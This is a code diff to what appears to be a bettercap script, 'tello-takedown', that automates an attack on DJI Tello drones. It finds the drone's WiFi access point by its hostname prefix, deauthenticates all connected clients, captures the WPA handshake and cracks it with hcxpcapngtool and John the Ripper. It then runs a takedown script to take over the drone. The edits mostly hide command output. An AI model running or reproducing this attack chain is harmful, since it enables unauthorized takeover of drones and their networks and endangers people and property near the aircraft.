@@ -1,11 +1,13 @@
 require("config");
 
 var target; // Target ap (drone) bssid
+var hostname;
 
 log('📝 Script tello-takedown started');
 
 log('📝 Turning on wifi recon');
 run('wifi.recon on');
+run('!sleep 2')
 
 /*log('📝 Setting up ticker');
 run('set wifi.show.sort clients desc');
@@ -47,14 +49,15 @@ onEvent('mod.started', function(event){
 onEvent('wifi.ap.new', function(event){
     var ap = event.data;
     log('📡 Access point detected: ' + ap.hostname + ' @ ' + ap.mac + ' (' + ap.vendor + ')');
-    log_debug('JSON object: ' + JSON.stringify(ap));
+    //debug('JSON object: ' + JSON.stringify(ap));
 
     if(ap.hostname.startsWith('TELLO-')){
         log('🚁 Drone identified, homing in on channel ' + ap.channel);
         run('wifi.recon.channel ' + ap.channel);
-
-        log('🎯 Locked onto target : ' + ap.mac);
+        
+        hostname = ap.hostname;
         target = ap.mac;
+        log('🎯 Locked onto target: ' + hostname + ' (' + target + ')');
 
         log('💀 Deauthing all clients, stand by...')
         run('wifi.deauth ' + target);
@@ -89,7 +92,7 @@ onEvent('wifi.client.handshake', function(event){
         //log('🪄 Converting packets to hashcat 22000 format');
         //cmd = hcxpcapngtool + ' -o ' + hashcatFormat22000FileName + ' ' + handshakesFileName;
         log('🪄 Converting packets to JtR wpapsk format');
-        cmd = hcxpcapngtool + ' --john ' + johnWPApskFileName + ' ' + handshakesFileName; //TODO: Add &> /dev/null?
+        cmd = hcxpcapngtool + ' --john ' + johnWPApskFileName + ' ' + handshakesFileName + ' &> /dev/null'; //TODO: Add &> /dev/null?
         log('Command: ' + cmd);
         run('!'+cmd);
 
@@ -99,7 +102,7 @@ onEvent('wifi.client.handshake', function(event){
         log('🪅 Cracking hashes, stand by...');
         //cmd = 'cd ' + hashcatHomePath + ' && ' + hashcat + ' -m 22000 -a 0' +
         //    ' -o ' + hashcatOutputFileName + ' ' + hashcatFormat22000FileName + ' ' +  wordlistFileName;
-        cmd = john + ' ' + johnWPApskFileName + ' --format=wpapsk --wordlist=' + wordlistFileName;
+        cmd = john + ' ' + johnWPApskFileName + ' --format=wpapsk --wordlist=' + wordlistFileName + ' &> /dev/null';
         log('Command: ' + cmd);
         run('!'+cmd);
 
@@ -109,7 +112,7 @@ onEvent('wifi.client.handshake', function(event){
         run('!'+cmd);
 
         log('💎 Taking down 🚁 and executing golang code');
-        cmd = 'sh takedown.sh ' + data.ap.hostname + ' ' + johnWPApskFileName;
+        cmd = 'sh takedown.sh ' + hostname + ' ' + johnWPApskFileName;
         run('!'+cmd);
     }
 });
